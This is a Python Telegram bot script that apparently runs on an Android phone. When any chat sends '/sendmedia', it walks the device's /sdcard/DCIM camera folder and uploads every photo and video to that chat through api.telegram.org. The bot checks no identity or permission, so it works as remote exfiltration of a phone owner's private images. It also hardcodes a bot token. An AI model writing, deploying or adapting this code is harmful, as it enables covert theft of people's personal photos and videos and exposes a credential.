import requests
import time
import logging
import os

# Replace with your actual Bot Token
BOT_TOKEN = '7902674854:AAGthUdNsxKk2AvuliFuELlBDpI44bbFGRI'
BASE_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/'

# Path to DCIM directory
DCIM_PATH = '/sdcard/DCIM/'

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Function to get updates
def get_updates(offset=None):
    url = BASE_URL + 'getUpdates'
    params = {'timeout': 100, 'offset': offset}
    response = requests.get(url, params=params)

    # Check for HTTP errors
    if response.status_code != 200:
        pass
        return []

    # Check for 'result' in the JSON response
    try:
        result_json = response.json()
        if 'result' in result_json:
            return result_json['result']
        else:
            pass
            return []
    except ValueError:
        pass
        return []

# Function to send a message
def send_message(chat_id, text):
    url = BASE_URL + 'sendMessage'
    params = {'chat_id': chat_id, 'text': text}
    requests.get(url, params=params)

# Function to send a file (image or video)
def send_file(chat_id, file_path):
    url = BASE_URL + ('sendPhoto' if file_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 'sendVideo')
    with open(file_path, 'rb') as file:
        files = {'photo' if file_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 'video': file}
        params = {'chat_id': chat_id}
        response = requests.post(url, params=params, files=files)
        
        if response.status_code != 200:
            pass

# Function to scan and send all media files in DCIM folder
def send_all_media(chat_id):
    # Traversing through DCIM directory
    for root, dirs, files in os.walk(DCIM_PATH):
        for file_name in files:
            if file_name.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov')):
                file_path = os.path.join(root, file_name)
                send_file(chat_id, file_path)
                time.sleep(1)  # Optional: Delay to avoid API rate limits

# Handler for the /start command
def handle_start(chat_id):
    message = 'Welcome! Send /sendmedia to receive all images and videos.'
    send_message(chat_id, message)

# Handler for the /help command
def handle_help(chat_id):
    message = "Commands:\n/start - Welcome message\n/help - List commands\n/sendmedia - Send all images and videos"
    send_message(chat_id, message)

# Main function to process updates and respond to commands
def main():
    offset = None
    while True:
        updates = get_updates(offset)
        for update in updates:
            # Update the offset to the latest update id + 1
            offset = update['update_id'] + 1

            if 'message' in update:
                message = update['message']
                chat_id = message['chat']['id']
                text = message.get('text')

                # Handle different commands or text messages
                if text == '/start':
                    handle_start(chat_id)
                elif text == '/help':
                    handle_help(chat_id)
                elif text == '/sendmedia':
                    send_message(chat_id, "Sending all images and videos...")
                    send_all_media(chat_id)
        
        # Short delay to avoid hitting API limits
        time.sleep(1)

if __name__ == '__main__':
    main()
